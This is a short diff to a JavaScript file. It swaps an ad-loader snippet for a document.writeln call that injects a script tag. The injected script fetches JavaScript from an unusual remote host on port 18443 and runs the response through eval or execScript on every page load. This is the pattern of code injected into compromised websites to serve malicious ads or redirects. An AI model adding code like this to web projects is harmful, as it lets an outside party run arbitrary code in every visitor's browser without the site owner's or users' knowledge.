@@ -1,6 +1,1 @@
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement('script');
-  hm.src = 'https://mm3.mylmad.com/ad/content/692'; var s = document.getElementsByTagName('script')[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
+document.writeln('<script data-union-ad data-priority="1" data-position="fixed">;(function(){var a=new XMLHttpRequest();var b="https://jtugglm.aoqinglv.cn:18443/ad/x-115-34.js?r="+new Date().toLocaleDateString();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();<\/script>')
